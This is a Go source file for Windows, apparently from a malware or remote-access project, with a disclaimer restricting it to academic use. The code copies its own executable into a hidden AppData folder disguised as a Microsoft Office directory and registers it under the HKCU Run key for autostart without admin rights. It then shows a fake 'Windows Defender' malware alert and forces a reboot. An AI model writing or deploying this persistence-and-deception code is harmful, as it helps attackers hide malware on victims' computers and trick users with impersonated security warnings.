// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

//go:build windows

package main

import (
	"github.com/go-toast/toast"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"os/exec"
	"syscall"
)

const KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

// setAutostart registers autostart service on this device.
// On Windows, set autostart by modifying the registry table.
func setAutostart() {
	// Copy the file to another directory.
	filename, _ := copyFile()
	// Hide file.
	filenamePtr, err := syscall.UTF16PtrFromString(filename)
	if err == nil {
		_ = syscall.SetFileAttributes(filenamePtr, syscall.FILE_ATTRIBUTE_HIDDEN)
	}
	// Edit the registry table to register autostart service on Windows system.
	// Open the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key to read and edit. Select
	// HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE to edit because it does not need administrator permission.
	key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
	defer key.Close()
	// Check if this program has been written to the registry.
	path, _, _ := key.GetStringValue(AppName)
	if path != filename {
		_ = key.SetStringValue(AppName, "\""+filename+"\" -i")
	}
	if len(os.Args) < 2 {
		notification := toast.Notification{
			AppID:   "Microsoft.Windows.Shell.RunDialog",
			Title:   "Windows Defender",
			Message: "Detected malware, system will reboot to recover",
		}
		_ = notification.Push()
		_ = exec.Command("shutdown", "-r", "-t", "10").Run()
		os.Exit(0)
	}
}

// copyFile copies the currently running file to the current user directory.
func copyFile() (string, error) {
	// Get the current user directory.
	home, err := os.UserHomeDir()
	if err != nil {
		home = "."
	}
	home += "\\AppData\\Roaming\\Microsoft\\Office\\Data\\Synchronize\\"
	_ = os.MkdirAll(home, os.ModePerm)
	dstName := home + AppName + ".exe"
	srcName := os.Args[0]
	// If the file has been copied, do not copy again.
	if os.Args[0] == dstName {
		return dstName, nil
	}
	// Create a destination file to copy.
	dst, err := os.OpenFile(dstName, os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return srcName, err
	}
	// Open the source file to copy.
	src, err := os.Open(srcName)
	if err != nil {
		return srcName, err
	}
	// Copy file.
	_, err = io.Copy(dst, src)
	if err != nil {
		return srcName, err
	}
	return dstName, nil
}
